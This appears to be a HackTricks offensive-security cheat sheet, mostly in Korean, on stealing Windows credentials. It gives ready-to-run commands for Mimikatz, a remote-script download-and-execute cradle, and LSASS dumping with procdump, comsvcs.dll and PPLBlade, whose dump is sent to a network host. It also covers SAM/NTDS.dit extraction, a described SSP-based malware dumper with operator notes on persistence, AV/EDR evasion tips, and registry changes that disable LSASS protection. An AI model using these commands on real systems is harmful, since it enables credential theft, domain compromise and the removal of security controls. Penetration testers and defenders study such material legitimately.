# Windows Credentials 탈취

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz로 할 수 있는 다른 작업들은** [**this page**](credentials-mimikatz.md)**에서 확인하세요.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**여기에서 가능한 일부 credentials 보호에 대해 알아보세요.**](credentials-protections.md) **이러한 보호 조치는 Mimikatz가 일부 credentials를 추출하는 것을 방지할 수 있습니다.**

## Meterpreter를 사용한 Credentials

제가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 피해자 내부에서 **passwords and hashes를 검색**하세요.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV 우회

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, 따라서 Defender에서 탐지되지 않습니다.\  
이 도구를 사용하면 **dump the lsass process**, **download the dump** 및 덤프에서 **extract** **credentials locally** 할 수 있습니다.

또한 [SharpDump](https://github.com/GhostPack/SharpDump)를 사용할 수도 있습니다.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
이 과정은 [SprayKatz](https://github.com/aas-n/spraykatz)로 자동화되어 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: 일부 **AV**는 **procdump.exe를 이용해 lsass.exe를 덤프하는 행위**를 **악성**으로 **탐지**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe"** 문자열을 탐지하기 때문입니다. 따라서 procdump에 lsass.exe의 **이름 대신** **PID**를 **인자로 전달**하는 것이 더 **은밀합니다.**

### **comsvcs.dll**로 lsass 덤프하기

`C:\Windows\System32`에 있는 **comsvcs.dll**이라는 DLL은 충돌 시 **프로세스 메모리 덤프**를 수행하는 역할을 합니다. 이 DLL에는 `MiniDumpW`라는 **함수**가 포함되어 있으며 `rundll32.exe`로 호출되도록 설계되어 있습니다.\
첫 두 인수는 중요하지 않지만, 세 번째 인수는 세 부분으로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 부분을 구성하고, 덤프 파일 위치가 두 번째 부분이며, 세 번째 부분은 엄격히 **full**이라는 단어뿐입니다. 다른 선택지는 없습니다.\
이 세 부분을 파싱한 후 DLL은 덤프 파일을 생성하고 지정된 프로세스의 메모리를 해당 파일로 기록합니다.\
**comsvcs.dll**을 사용하면 lsass 프로세스를 덤프할 수 있으므로 procdump를 업로드하고 실행할 필요가 없습니다. 이 방법은 자세히 다음에 설명되어 있습니다: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

다음 명령으로 실행합니다:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**이 과정을 [**lssasy**](https://github.com/Hackndo/lsassy)로 자동화할 수 있습니다**.

### **Task Manager로 lsass 덤프하기**

1. Task Bar를 우클릭하고 Task Manager를 클릭합니다
2. More details를 클릭합니다
3. Processes 탭에서 "Local Security Authority Process" 프로세스를 찾습니다
4. "Local Security Authority Process" 프로세스를 우클릭하고 "Create dump file"을 클릭합니다.

### procdump로 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)은 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 스위트의 일부인 Microsoft에서 서명한 바이너리입니다.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade로 lsass 덤프하기

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 는 Protected Process Dumper Tool로, memory dump를 난독화하고 디스크에 저장하지 않고 원격 워크스테이션으로 전송하는 것을 지원합니다.

**주요 기능**:

1. PPL 보호 우회
2. Defender의 서명 기반 탐지 메커니즘을 회피하기 위해 memory dump 파일을 난독화
3. RAW 및 SMB 업로드 방법으로 memory dump를 디스크에 저장하지 않고 업로드(fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump 없이 SSP 기반 LSASS 덤핑

Ink Dragon은 **LalsDumper**라는 3단계 덤퍼를 배포합니다. 이 덤퍼는 `MiniDumpWriteDump`를 호출하지 않으므로 해당 API에 대한 EDR 훅이 작동하지 않습니다:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`에서 32개의 소문자 `d` 문자로 구성된 플레이스홀더를 찾아 이를 `rtu.txt`의 절대 경로로 덮어쓰고, 패치된 DLL을 `nfdp.dll`로 저장한 뒤 `AddSecurityPackageA("nfdp","fdp")`를 호출합니다. 이로써 **LSASS**가 악성 DLL을 새로운 Security Support Provider (SSP)로 로드하도록 강제합니다.
2. **Stage 2 inside LSASS** – LSASS가 `nfdp.dll`을 로드하면, DLL은 `rtu.txt`를 읽고 각 바이트를 `0x20`으로 XOR한 뒤 디코딩된 블롭을 메모리에 매핑하고 실행을 이전합니다.
3. **Stage 3 dumper** – 매핑된 페이로드는 해싱된 API 이름에서 해석된 **direct syscalls**를 사용해 MiniDump 로직을 재구현합니다 (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom`이라는 전용 export는 `%TEMP%\<pid>.ddt`를 열어 압축된 LSASS 덤프를 파일에 스트리밍한 뒤 핸들을 닫아 나중에 exfiltration을 수행할 수 있게 합니다.

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, 및 `rtu.txt`를 동일한 디렉토리에 보관하세요. Stage 1은 하드코딩된 플레이스홀더를 `rtu.txt`의 절대 경로로 덮어쓰므로 분리하면 체인이 끊어집니다.
* 등록은 `nfdp`를 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`에 추가하여 이루어집니다. 이 값을 직접 설정하면 LSASS가 부팅 시마다 SSP를 재로드하도록 할 수 있습니다.
* `%TEMP%\*.ddt` 파일은 압축된 덤프입니다. 로컬에서 압축을 풀고 Mimikatz/Volatility에 제공하여 자격 증명을 추출하세요.
* `lals.exe` 실행에는 admin/SeTcb 권한이 필요하여 `AddSecurityPackageA`가 성공해야 합니다; 호출이 반환되면 LSASS는 투명하게 악성 SSP를 로드하고 Stage 2를 실행합니다.
* 디스크에서 DLL을 삭제해도 LSASS에서 제거되지 않습니다. 레지스트리 항목을 삭제하고 LSASS를 재시작(재부팅)하거나 장기간 지속성을 위해 그대로 놔둘 수 있습니다.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA 비밀 덤프
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 대상 DC에서 NTDS.dit 덤프하기
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 대상 DC에서 NTDS.dit password history Dump
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 각 NTDS.dit 계정에 대한 pwdLastSet 속성 표시
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

이 파일들은 **_C:\windows\system32\config\SAM_** 및 **_C:\windows\system32\config\SYSTEM._** 에 **위치해 있습니다**. 그러나 **일반적인 방법으로는 단순히 복사할 수 없습니다** — 보호되어 있기 때문입니다.

### 레지스트리에서

가장 쉬운 방법은 레지스트리에서 복사본을 얻는 것입니다:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
해당 파일들을 Kali 머신으로 **Download** 하고, **extract the hashes** 하려면 다음을 사용하세요:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

이 서비스를 사용하면 보호된 파일을 복사할 수 있습니다. 관리자 권한이 필요합니다.

#### vssadmin 사용

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
하지만 **Powershell**에서도 동일하게 할 수 있습니다. 다음은 **SAM 파일을 복사하는 방법**의 예시입니다 (사용된 하드 드라이브는 "C:"이고 저장 위치는 C:\users\Public) 하지만 이것은 어떤 보호된 파일을 복사할 때에도 사용할 수 있습니다:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
책에서 발췌: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

마지막으로, [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용하여 SAM, SYSTEM 및 ntds.dit의 복사본을 만들 수도 있습니다.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file는 **Active Directory**의 핵심으로 알려져 있으며, 사용자 객체, 그룹 및 멤버십에 대한 중요한 데이터를 저장합니다. 도메인 사용자들의 **password hashes**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.

이 데이터베이스에는 주로 세 가지 테이블이 유지됩니다:

- **Data Table**: 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 객체의 **Security descriptors**가 저장되어 객체의 보안 및 접근 제어를 보장합니다.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows는 해당 파일과 상호작용하기 위해 _Ntdsa.dll_을 사용하며, 이는 _lsass.exe_에 의해 사용됩니다. 그러므로 **NTDS.dit** 파일의 일부는 **lsass** 메모리 안에 위치할 수 있습니다(성능 향상을 위해 **cache**를 사용하기 때문에 최근 접근한 데이터를 찾을 수 있습니다).

#### Decrypting the hashes inside NTDS.dit

해시는 3단계로 암호화되어 있습니다:

1. BOOTKEY와 **RC4**를 사용해 Password Encryption Key (**PEK**)를 복호화합니다.
2. **PEK**와 **RC4**를 사용해 **hash**를 복호화합니다.
3. **DES**를 사용해 **hash**를 복호화합니다.

**PEK**는 **모든 domain controller에서 동일한 값**을 가지지만, **NTDS.dit** 파일 안에서는 해당 도메인 컨트롤러의 **SYSTEM** 파일의 **BOOTKEY**로 **암호화(cyphered)** 되어 있습니다(도메인 컨트롤러마다 다릅니다). 그래서 NTDS.dit 파일에서 자격 증명을 얻으려면 **NTDS.dit**와 **SYSTEM** 파일이 필요합니다 (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **NTDS.dit에서 hashes 추출하기**

**NTDS.dit** 및 **SYSTEM** 파일을 **입수한** 후에는 _secretsdump.py_와 같은 도구를 사용하여 **hashes를 추출**할 수 있습니다:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
유효한 domain admin user를 사용하여 **자동으로 추출할 수도 있습니다**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ or **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit에서 도메인 객체를 SQLite 데이터베이스로 추출하기**

NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용해 SQLite 데이터베이스로 추출할 수 있습니다. 이 도구는 secrets뿐만 아니라 전체 객체와 그 속성까지 추출하므로, 원시 NTDS.dit 파일을 이미 확보한 경우 추가 정보 추출에 유용합니다.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive는 선택 사항이지만 비밀을 해독할 수 있게 해줍니다 (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). 다른 정보와 함께 다음 데이터가 추출됩니다: 해시가 포함된 사용자 및 컴퓨터 계정, UAC flags, 마지막 로그온 및 암호 변경 타임스탬프, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, 신뢰된 도메인(신뢰 유형, 방향 및 속성)...
 
## Lazagne

바이너리는 [here](https://github.com/AlessandroZ/LaZagne/releases)에서 다운로드하세요. 이 바이너리를 사용해 여러 소프트웨어에서 자격 증명을 추출할 수 있습니다.
```
lazagne.exe all
```
## SAM 및 LSASS에서 자격 증명을 추출하기 위한 기타 도구

### Windows credentials Editor (WCE)

이 도구는 메모리에서 자격 증명을 추출하는 데 사용할 수 있습니다. 다음에서 다운로드: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명을 추출합니다.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM 파일에서 자격 증명을 추출
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **실행하면** 비밀번호가 추출됩니다.

## 유휴 RDP 세션 확보 및 보안 통제 약화

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory 스타일 텔레메트리 수집

* **아웃바운드 RDP 대상** – 각 사용자 hive를 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`에서 파싱합니다. 각 서브키는 서버 이름, `UsernameHint`, 마지막 작성 타임스탬프를 저장합니다. PowerShell로 FinalDraft의 로직을 복제할 수 있습니다:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **인바운드 RDP 증거** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 로그에서 Event ID **21**(성공적 로그인)과 **25**(연결 끊김)을 조회해 누가 해당 호스트를 관리했는지 매핑합니다:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

어떤 Domain Admin이 정기적으로 접속하는지 알게 되면, 그들의 **disconnected** 세션이 여전히 존재하는 동안 LSASS를 덤프하세요 (LalsDumper/Mimikatz 사용). CredSSP + NTLM fallback은 검증자와 토큰을 LSASS에 남기며, 이는 SMB/WinRM을 통해 재생되어 `NTDS.dit`를 획득하거나 도메인 컨트롤러에 persistence를 단계적으로 설치하는 데 사용될 수 있습니다.

### FinalDraft가 대상으로 삼는 레지스트리 다운그레이드

같은 임플란트는 자격증명 탈취를 쉽게 하기 위해 여러 레지스트리 키를 조작합니다:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` 설정은 RDP 동안 자격 증명/티켓의 완전 재사용을 강제하여 pass-the-hash 스타일의 피벗을 가능하게 한다.
* `LocalAccountTokenFilterPolicy=1`은 UAC 토큰 필터링을 비활성화하여 로컬 관리자가 네트워크를 통해 제약 없는 토큰을 받게 한다.
* `DSRMAdminLogonBehavior=2`은 DC가 온라인 상태일 때 DSRM 관리자가 로그온할 수 있게 하여 공격자에게 또 다른 내장 고권한 계정을 제공한다.
* `RunAsPPL=0`은 LSASS PPL 보호를 제거하여 LalsDumper와 같은 덤퍼가 메모리에 쉽게 접근할 수 있게 만든다.

## 참고자료

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
